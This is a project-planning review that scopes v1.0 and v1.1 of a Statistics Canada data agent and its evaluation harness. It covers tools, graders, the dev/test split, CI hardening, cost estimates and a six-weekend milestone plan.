4. **v1.0** `get_series`: members as `{position: id}`, server builds the padded coordinate, validates metadata, checks `responseStatusCode==0 && vectorId>0`, uses the LatestNPeriods call as primary, retries 3x on resets and empty bodies.
5. **v1.0** Index all member names in FTS, cap the embedded card, use OR-ed FTS terms, and record the expected member id in each golden case (Rent=81).
6. **v1.0** Grade `answer_values` by prose containment plus a `{vector_id, ref_period}` citation checked against the run's own `get_series` output. Refusal means `refused:true` with empty values. Ambiguous cases list `accepted_interpretations` (eval B4/M5).
7. **v1.0** Server-side untrusted-text handling: a JSON-escaped `untrusted_text` field, server-built source URLs, a length cap on tool results, a canary token, and `allowed_tools` per injection case (sec B2/M1/M2/M4).
8. **v1.1** Dev/test split by table group, 50-label judge with seeded unfaithful answers, Wilson CI on the headline, CODEOWNERS, SHA-pinned actions, custom httpx allowlist transport, `history.jsonl` chart. Note: FINDINGS.md and the claims-to-evidence table (scope M2/B3) are cheap and high-value, so pull those two into v1.0.


---

## r2-scope

# r2-scope (hiring manager / scope cop)

## 1. CHALLENGE

Overkill for v1.0 (cut or defer):
- Eval M2 "50 labels with >=15 seeded unfaithful... Cohen's kappa". That is a research-paper judge study. The judge is advisory and I already moved it to v1.1. In v1.1, 30 labels with seeded errors is enough.
- Eval open Q2 "Wilson 95% CI... grow to ~100 cases". Wilson CI is one line of code and worth it. 100 cases is v1.1+.
- Security M5 "CODEOWNERS" on a solo repo is theatre, since he reviews himself. Replace it with one sentence: the CI comment flags diffs touching evals/baseline. Security M6 "Dependabot weekly" and "Docker images pinned by digest" are v1.1 (`uv.lock` plus `--locked` is v1.0, it is free).
- Eval's `compute` tool plus the full `{op, operands}` recompute grader (B4): a whole extra tool and grader. It is the right design, but it belongs in v1.1. v1.0 does regex prose-contains-value plus golden-value check.

Genuinely required (a manager will check these):
- Eval B3: "the PR gate uses **dev only**. Test runs only at release tags." Without it, the "held-out" claim is false.
- Eval B1 / Data B1: live-agent CI cannot use request-keyed replay. A snapshot backend is needed, but scoped to the golden tables only.
- Eval B4 (weak form): "the prose must contain each answer_values number". It makes the grader non-circular.
- Security B1: "on: pull_request only, never pull_request_target... dedicated Console workspace key with its own spend limit". One afternoon, and it is the first thing a security-minded reader looks for.
- Security B2: "canary token", with `max_tool_calls` and `allowed_tools` per injection case. This makes "injection pass" mechanical.
- Security M1 and M2: escaped `untrusted_text`, server-built source URLs, host allowlist in the citation grader.
- Data fact 4: check `responseStatusCode == 0` and `vectorId > 0`. Fact 5: `getDataFromCubePidCoordAndLatestNPeriods` is the fallback, because the POSTs are unreliable.

## 2. CONCEDE

- Eval B2 changed my mind; B3 and Security B1/B2/M1/M2 too (cheap, concrete, make claim 4 real). Data fact 2: index ALL member names in `tsv`. My "2 case flake tolerance" was statistically indefensible. A dev-only gate with k=3 on Haiku is affordable. Take 24 dev cases x 3 x about 6 calls, roughly 450 calls at Haiku prices of about $0.01-0.03 per case-run. That is about $1-2 per gate run. At $20/month and 10-15 PRs, it fits, provided Security B1's $10 workspace cap and a tool-result cap are in place.

## 3. MUST-FIX (ranked)

1. Cut scope to 3 tools, 40 cases (24 dev / 16 test), 12 injection cases; judge, weekly job, month budget go to v1.1. [v1.0]
2. Dev-only PR gate with k=3 and a flip rule; test split only at tags, aggregates only, Wilson CI. [v1.0]
3. Golden-tables snapshot backend plus committed index dump, replacing request cassettes. [v1.0]
4. Mechanical injection grading (canary, allowed_tools, max_tool_calls), escaped `untrusted_text`, server-built URLs. [v1.0]
5. CI hygiene: `pull_request` only, workspace key with $10 cap, tool-result token cap, `uv.lock` plus `--locked`, SHA-pinned actions (just do it once). [v1.0]
6. WDS correctness: server builds the padded coordinate, checks `responseStatusCode`/`vectorId`, retries max 3, falls back to LatestNPeriods, never caches non-200/409. [v1.0]
7. Proof artifacts: linked failing PR, `FINDINGS.md` with 3 real catches, history chart, claims-to-evidence table, ownership ADRs. [v1.0]
8. `compute` tool and recompute grader, 30-label judge, CODEOWNERS, Dependabot, digest pins, 100 cases. [v1.1]

## Milestone plan (6 weekends)
- W1: verify the stack, indexer, cards (all members in FTS), vector recall@5.
- W2: FTS+RRF ablation, MCP with 3 tools, WDS client with fallback, limiter, cache.
- W3: agent CLI, citations, answer_values, trace GIF, `make seed`.
- W4: 40 golden cases hand-checked against the StatCan site, graders, snapshot backend.
- W5: k=3 dev gate, CI hardening, 12 injection cases, a real failing PR.
- W6: tag v1.0, test-split run, FINDINGS, chart, ADRs, README evidence table.
